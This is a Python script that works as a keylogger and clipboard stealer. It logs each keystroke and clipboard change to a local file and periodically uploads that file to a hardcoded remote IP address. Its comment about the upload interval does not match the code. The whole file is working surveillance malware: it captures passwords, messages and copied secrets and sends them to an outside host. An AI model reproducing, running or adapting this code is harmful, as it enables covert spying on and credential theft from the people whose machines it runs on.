
import subprocess
import sys
import time
import os
import threading
import requests
import pyperclip
from pynput import keyboard

# File to store clipboard and keyboard history
output_file = "temp.log"

# Server URL
upload_url = "http://216.158.225.243:8081/api/upload"

# Create file if it doesn't exist
if not os.path.exists(output_file):
    with open(output_file, "w") as f:
        f.write("Clipboard and Keyboard History:\n")

# Function to monitor clipboard changes
def monitor_clipboard():
    previous_text = ""
    while True:
        try:
            current_text = pyperclip.paste()
            if current_text != previous_text:
                previous_text = current_text
                with open(output_file, "a", encoding="utf-8") as f:
                    f.write(f"\n-----{time.ctime()} [Clipboard]:\n{current_text}\n-----------------\n")
        except Exception as e:
            print(f"Clipboard error: {e}")
        time.sleep(1)


# Function to log keyboard events
def monitor_keyboard():
    def on_press(key):
        try:
            with open(output_file, "a", encoding="utf-8") as f:
                f.write(f"{key.char}")
        except AttributeError:
            print(f"{time.ctime()} [Special Key]: {key}")
            # with open(output_file, "a", encoding="utf-8") as f:
            #     f.write(f"{time.ctime()} [Special Key]: {key}\n")

    def on_release(key):
        if key == keyboard.Key.esc:
            return False  # Stop listener on Esc key

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Function to upload the log file
def upload_log_file():
    while True:
        try:
            if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                # Read and upload the file
                with open(output_file, "rb") as f:
                    files = {"file": f}
                    response = requests.post(upload_url, files=files)
                    if response.status_code == 200:
                        print(f"Log file uploaded successfully at {time.ctime()}")
                        # Clear the file after successful upload
                        open(output_file, "w").close()
                    else:
                        print(f"Failed to upload log file: {response.status_code} - {response.text}")
        except Exception as e:
            print(f"Error uploading log file: {e}")
        # Upload every 10 minutes
        time.sleep(1800)

# Function to run in the background
def run_in_background():
    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
    keyboard_thread = threading.Thread(target=monitor_keyboard, daemon=True)
    upload_thread = threading.Thread(target=upload_log_file, daemon=True)

    clipboard_thread.start()
    keyboard_thread.start()
    upload_thread.start()

    clipboard_thread.join()

if __name__ == "__main__":
    print("Monitoring clipboard and uploading logs every 10 minutes. Press Ctrl+C to stop.")
    run_in_background()
